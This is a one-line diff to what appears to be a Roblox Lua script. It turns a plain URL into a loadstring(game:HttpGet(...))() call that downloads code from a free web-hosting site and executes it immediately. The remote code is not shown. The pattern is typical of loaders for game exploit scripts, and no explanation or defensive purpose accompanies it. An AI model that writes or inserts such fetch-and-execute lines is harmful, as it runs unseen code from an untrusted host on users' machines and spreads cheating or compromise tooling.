@@ -1,1 +1,1 @@
-https://godpatter.000webhostapp.com/OuONice
+loadstring(game:HttpGet("https://godpatter.000webhostapp.com/OuONice", true))()
